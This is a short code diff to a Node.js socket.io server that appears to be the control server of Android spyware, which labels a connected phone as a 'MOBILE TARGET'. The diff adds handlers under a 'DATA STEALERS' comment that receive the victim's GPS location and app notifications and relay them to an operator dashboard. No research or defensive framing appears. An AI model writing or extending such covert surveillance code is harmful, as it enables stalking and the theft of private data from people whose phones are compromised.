@@ -42,6 +42,18 @@ io.on('connection', (socket) => {
             androidSocketId = socket.id;
             console.log(`[!] MOBILE TARGET (ANDROID) CONNECTED: ${socket.id}`);
             io.emit('status', 'ONLINE');
+
+            // --- DATA STEALERS ---
+            socket.on('gps', (data) => {
+                console.log(`[+] GPS: ${data.lat}, ${data.lon}`);
+                io.emit('gps', data); // Broadcast to dashboard
+            });
+
+            socket.on('notification', (data) => {
+                console.log(`[+] NOTIF: ${data.app}`);
+                io.emit('notification', data); // Broadcast to dashboard
+            });
+
         } else if (type === 'mobile') {
             console.log(`[+] CONTROLLER (MOBILE) CONNECTED: ${socket.id}`);
             if (pcSocketId || androidSocketId) socket.emit('status', 'ONLINE');
